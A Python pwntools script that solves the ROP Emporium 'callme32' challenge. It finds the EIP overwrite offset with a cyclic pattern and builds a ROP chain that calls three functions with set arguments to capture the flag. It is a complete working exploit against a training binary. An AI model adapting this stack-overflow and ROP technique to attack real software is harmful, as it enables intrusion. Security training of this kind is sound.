#!/usr/bin/env python3

# ROP Emporium - callme32 solution using pwntools library
# Link: https://ropemporium.com/challenge/callme.html
# Created by dilldylanpickle on 5-6-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

import os           # Provides a way of using operating system dependent functionalities
import re           # Allows pattern matching and text processing through regex
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Load the cached gadgets for the binary
        rop = ROP(elf)

        # Use ROPgadget to find the address of a "pop esi ; pop edi ; pop ebp ; ret" instruction
        gadget = ROP(elf).find_gadget(['pop esi', 'pop edi','pop ebp','ret']).address
        log.debug(f"The address of ROP gadget pop esi ; pop edi ; pop ebp ; ret is {hex(gadget)}")

        # Get the address of the callme_one function in the procedure linkage table
        callme_one_addr = elf.plt['callme_one']
        log.debug(f"The address of callme_one is {hex(callme_one_addr)}")

        # Get the address of the callme_two function in the procedure linkage table
        callme_two_addr = elf.plt['callme_two']
        log.debug(f"The address of callme_two is {hex(callme_two_addr)}")

        # Get the address of the callme_three function in the procedure linkage table
        callme_three_addr = elf.plt['callme_three']
        log.debug(f"The address of callme_three is {hex(callme_three_addr)}")

        # Define a list of all the callme() functions
        function_addr = [callme_one_addr, callme_two_addr, callme_three_addr]

        # Get the offset by calling the find_offset() function
        offset = find_offset(binary_path)
        log.debug(f"The offset calculate to overwrite EIP is {offset} bytes")

        # Construct the payload
        payload = b'\x69' * offset

        # Loop through the callme() addresses and add the arguments for each function call
        for addr in function_addr:
            payload += p32(addr)
            payload += p32(gadget)
            payload += p32(0xdeadbeef)
            payload += p32(0xcafebabe)
            payload += p32(0xd00df00d)
        
        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))

        # Send the payload and print the output
        io.sendline(payload)
        output = io.clean().decode()
        log.info(output)

        # Use regular expression to search for the flag pattern
        flag_pattern = r'ROPE{[^}]+}'
        match = re.search(flag_pattern, output)

        # Verify if the ROP exploit was successful in capturing the flag 
        if match:
            flag = match.group(0)
            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
        else:
            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")

def find_offset(binary_path):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)
    
    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Send a cyclic pattern as input to the binary
        pattern = cyclic(69)
        io.sendline(pattern)
        io.wait()           

        # Get the corefile to extract the value of the instruction pointer (eip)
        core = io.corefile
        eip = core.eip

        # Find the offset by searching for the cyclic pattern in the eip value
        offset = cyclic_find(p32(eip), n=4)

        # Revert the log level to the original value
        context.log_level = log_level

    # Return the calculated offset to overwrite the instruction pointer
    return offset

if __name__ == '__main__':

    binary_path = './callme32'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))
